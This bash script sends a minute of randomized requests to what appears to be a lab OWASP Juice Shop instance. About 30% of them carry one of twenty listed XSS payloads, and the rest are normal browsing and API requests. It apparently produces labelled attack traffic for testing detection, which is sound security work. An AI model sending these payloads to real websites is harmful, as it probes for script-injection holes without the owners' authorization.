#!/bin/bash
TARGET_IP="${TARGET_IP:-100.64.0.20}"
JUICE_URL="http://${TARGET_IP}:${PORT}"
DURATION_SECONDS=60
END_TIME=$(( $(date +%s) + DURATION_SECONDS ))
INTERVAL=1

ts() { date +"%Y-%m-%dT%H:%M:%S.%3N%:z"; }

total_requests=0
xss_attacks=0
normal_requests=0

echo "--- Starting Randomized Mixed Traffic for ${DURATION_SECONDS} seconds ---"
echo "Target: $JUICE_URL"

# XSS attack patterns from xss_attack.sh
xss_patterns=(
    "<script>alert(1)</script>"
    "<img%20src=x%20onerror=alert(1)>"
    "<svg%20onload=alert(1)>"
    "<iframe%20src='javascript:alert(1)'>"
    "<a%20href='javascript:alert(1)'>Click</a>"
    "<input%20autofocus%20onfocus=alert(1)>"
    "<body%20onload=alert(1)>"
    "<details%20open%20ontoggle=alert(1)>"
    "\"><svg%20onload=alert(1)>"
    "</textarea><script>alert(1)</script>"
    "<img%20src=1%20onerror=prompt(1)>"
    "<marquee%20onstart=confirm(1)>"
    "<script>/*</script><script>alert(1)</script>"
    "<script>''-alert(1)//</script>"
    "<svg><script>alert(1)</script></svg>"
    "<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>"
    "<video%20src='invalid'%20onerror='alert(1)'>"
    "<object%20data='javascript:alert(1)'>"
    "<embed%20src='javascript:alert(1)'>"
    "<form%20action='javascript:alert(1)'><input%20type='submit'></form>"
)

# Normal traffic patterns
normal_patterns=(
    "/"
    "/search?q=product"
    "/login"
    "/api/Products"
    "/profile"
    "/basket"
    "/search?q=juice"
    "/contact"
    "/about"
    "/rest/user/login"
    "/rest/products/search?q=apple"
    "/rest/basket/1"
    "/rest/user/whoami"
    "/assets/public/images/products/apple_juice.jpg"
    "/socket.io/?transport=polling"
    "/rest/products/1"
    "/rest/products/2"
    "/api/Challenges"
    "/rest/user/change-password"
    "/rest/user/security-question"
)

# Function to generate random traffic
generate_traffic() {
    # 30% chance of XSS attack, 70% chance of normal traffic
    if [ $((RANDOM % 100)) -lt 30 ]; then
        # XSS attack
        pattern=${xss_patterns[$((RANDOM % ${#xss_patterns[@]}))]}
        echo "[$(ts)] XSS Attack: $pattern"
        curl -s "${JUICE_URL}/?q=${pattern}" -o /dev/null
        ((xss_attacks++))
    else
        # Normal traffic
        pattern=${normal_patterns[$((RANDOM % ${#normal_patterns[@]}))]}
        echo "[$(ts)] Normal Request: $pattern"
        curl -s "${JUICE_URL}${pattern}" -o /dev/null
        ((normal_requests++))
    fi
    ((total_requests++))
}

# Generate randomized mixed traffic
while [ "$(date +%s)" -lt "$END_TIME" ]; do
    generate_traffic
    sleep "$INTERVAL"
done

echo "--- Mixed traffic generation complete ---"
echo "Total requests sent: $total_requests"
echo "XSS attacks: $xss_attacks"
echo "Normal requests: $normal_requests"
echo "Attack ratio: $(echo "scale=2; $xss_attacks * 100 / $total_requests" | bc -l)%"
echo "Completed at: $(ts)"
